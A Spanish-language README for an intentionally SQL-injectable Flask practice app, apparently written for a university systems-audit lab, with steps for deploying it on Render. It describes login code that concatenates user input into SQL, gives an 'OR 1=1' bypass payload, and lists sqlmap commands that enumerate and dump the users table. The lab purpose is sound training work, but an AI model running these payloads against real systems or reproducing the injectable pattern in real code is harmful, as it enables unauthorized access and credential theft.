# Laboratorio 8 — App de práctica (vulnerable a propósito)

Aplicación mínima en Flask + SQLite, creada **únicamente para que practiques
tú mismo** con `sqlmap` en tu laboratorio de Auditoría de Sistemas. La ruta
`/login` concatena el parámetro `usuario`/`password` directamente en la
consulta SQL (sin sanitizar), de forma intencional, para que sea
inyectable.

## ⚠️ Uso responsable

- Es un proyecto de **juguete**, con datos ficticios.
- No subas datos reales ni reutilices contraseñas reales.
- Es para tu práctica personal del laboratorio. Una vez termines, puedes
  pausar o eliminar el servicio en Render.

## 1. Probarlo en local (opcional)

```bash
pip install -r requirements.txt
python app.py
```

Abre `http://localhost:5000` en tu navegador.

## 2. Subir a Render (gratis)

1. Crea un repositorio en GitHub con estos archivos (`app.py`,
   `requirements.txt`, carpeta `templates/`, este `README.md`).
2. Entra a [render.com](https://render.com) y crea una cuenta gratuita
   (puedes usar tu cuenta de GitHub para entrar).
3. Click en **New +** → **Web Service**.
4. Conecta tu repositorio de GitHub (dale permiso si te lo pide).
5. En la configuración del servicio:
   - **Name**: `lab8-sqli-practica` (o el nombre que quieras)
   - **Region**: la más cercana
   - **Branch**: `main`
   - **Runtime**: `Python 3`
   - **Build Command**: `pip install -r requirements.txt`
   - **Start Command**: `gunicorn app:app`
   - **Instance Type**: `Free`
6. Click en **Create Web Service**. Render construirá y desplegará la app
   (tarda 1–3 minutos).
7. Cuando termine, Render te da una URL tipo:
   `https://lab8-sqli-practica.onrender.com`

Esa es la URL que usarás como objetivo en `sqlmap`, apuntando al endpoint
`/login`, por ejemplo:

```
https://lab8-sqli-practica.onrender.com/login?usuario=admin&password=x
```

## 3. Verificación manual (antes de usar sqlmap)

Abre en el navegador:

```
https://lab8-sqli-practica.onrender.com/login?usuario=admin' OR '1'='1&password=x
```

Deberías ver la pantalla de "¡Bienvenido!" — eso confirma que el
parámetro `usuario` es inyectable y que la app está lista para el
laboratorio.

## 4. Comandos de sqlmap que puedes usar en Kali

(Ejecútalos tú desde tu VM de Kali contra tu propia URL de Render)

```
sqlmap -u "https://lab8-sqli-practica.onrender.com/login?usuario=admin&password=x" --batch
sqlmap -u "https://lab8-sqli-practica.onrender.com/login?usuario=admin&password=x" --dbs --batch
sqlmap -u "https://lab8-sqli-practica.onrender.com/login?usuario=admin&password=x" -D prueba --tables --batch
sqlmap -u "https://lab8-sqli-practica.onrender.com/login?usuario=admin&password=x" -D prueba -T usuarios --columns --batch
sqlmap -u "https://lab8-sqli-practica.onrender.com/login?usuario=admin&password=x" -D prueba -T usuarios --dump --batch
```

Nota: al ser SQLite, el nombre de "base de datos" que reporte sqlmap
puede variar (a veces aparece como el nombre del archivo o como
`SQLite_masterdb`); lo importante para tu informe es la tabla
`usuarios` con las columnas `usuario` y `password` expuestas.

## 5. Después del laboratorio

En el dashboard de Render puedes **Suspend** o eliminar el servicio
para que no quede expuesto innecesariamente.
